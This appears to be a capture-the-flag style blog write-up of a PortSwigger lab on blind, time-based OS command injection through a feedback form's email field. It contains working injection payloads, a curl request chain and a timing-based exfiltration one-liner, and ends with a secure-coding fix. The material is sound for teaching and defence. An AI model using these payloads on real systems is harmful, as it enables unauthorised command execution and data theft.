---
layout: post
title: "PortSwigger: Blind OS Command Injection with Time Delays"
date: 2027-09-09 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, CommandInjection]
tags: [portswigger, os-command-injection, blind, time-delay, ping, feedback-form, cwe-78]
---

OS command injection is one thing when the command's output prints straight back in the response — you inject `whoami` and read the username. It's a much quieter problem when the app runs your command but shows you **nothing**, and there's no out-of-band channel to phone home through either. This lab is that case: a blind injection where the only thing you can measure is how long the server takes to answer. The fix is to make it pause on command, and time the response.

## Overview

The feedback form's `email` field is spliced into a back-end shell command without sanitisation. The response never reflects the command's output, so we prove execution by injecting a command that sleeps for ~10 seconds and comparing the response time against a normal submission.

- **Vuln class:** OS command injection (blind, time-based)
- **CWE:** [CWE-78 — OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- **Vulnerable parameter:** `email` on `POST /feedback/submit`

## Finding the injection point

The feedback form posts five fields — `csrf`, `name`, `email`, `subject`, `message`. The `email` value is the one that ends up in a shell command on the server. Because nothing it produces comes back to us, we can't use a `whoami`-style probe. We need a side channel, and the simplest one available is **time**.

## The payload

```
x||ping -c 10 127.0.0.1||
```

Read left to right as the shell sees it:

- `x` — a bogus command that fails.
- `||` — the shell **OR** operator: *"if the left side failed, run the right side."* Since `x` failed, the shell runs the next command.
- `ping -c 10 127.0.0.1` — sends 10 ICMP packets to localhost, one per second, so it takes about **10 seconds**.
- the trailing `||` — short-circuits whatever the app appended after our value, so the overall line doesn't throw an error.

The net effect: a benign email returns instantly, but our payload forces a measurable ten-second stall.

## The working request

The CSRF token is single-use, so grab a fresh one from `GET /feedback` for every submission, then send:

```
POST /feedback/submit HTTP/1.1
Host: <lab>
Content-Type: application/x-www-form-urlencoded

csrf=<token>&name=x&email=x%7C%7Cping+-c+10+127.0.0.1%7C%7C&subject=x&message=x
```

Done with `curl`, timing both a baseline and the injection:

```bash
# baseline — a normal email
curl -sk -X POST "https://<lab>/feedback/submit" \
  --data-urlencode "csrf=<token>" --data-urlencode "name=x" \
  --data-urlencode "email=test@test.com" \
  --data-urlencode "subject=x" --data-urlencode "message=x" \
  -o /dev/null -w "time=%{time_total}s\n"
# time=0.55s

# injection — ping for 10 seconds
curl -sk -X POST "https://<lab>/feedback/submit" \
  --data-urlencode "csrf=<token>" --data-urlencode "name=x" \
  --data-urlencode "email=x||ping -c 10 127.0.0.1||" \
  --data-urlencode "subject=x" --data-urlencode "message=x" \
  -o /dev/null -w "time=%{time_total}s\n"
# time=9.90s
```

| Request | email value | Response time |
|---|---|---|
| Baseline | `test@test.com` | 0.55 s |
| Injection | `x\|\|ping -c 10 127.0.0.1\|\|` | 9.90 s |

A ~9.4-second jump — and one that scales if you bump `-c 10` to `-c 20` — proves the back end is executing our `ping`. The lab flips to **Solved** the moment that delay is observed.

## Where it goes from here

A timing oracle isn't just a yes/no confirmation. The same clock turns into a one-character-per-request exfiltration channel:

```bash
$(if [ "$(whoami|cut -c1)" = a ]; then sleep 10; fi)
```

Loop that over each character position and the alphabet, and a "blind, no output, no callback" injection quietly reads back arbitrary data — slowly, but completely.

## The fix

Never build a shell string out of user input. Pass arguments as an **argv array** to a no-shell exec, so metacharacters like `||` are treated as literal text rather than shell syntax. Validate the email field on top of that:

```js
if (!/^[^@\s]+@[^@\s]+$/.test(email)) throw new Error('bad email');
execFile('/usr/bin/mail', ['-s', 'feedback', email]);   // no shell, no injection
```

With no shell interpreter in the loop, `x||ping -c 10 127.0.0.1||` is just a (rejected) email address — there's nothing left for the `||` to do.
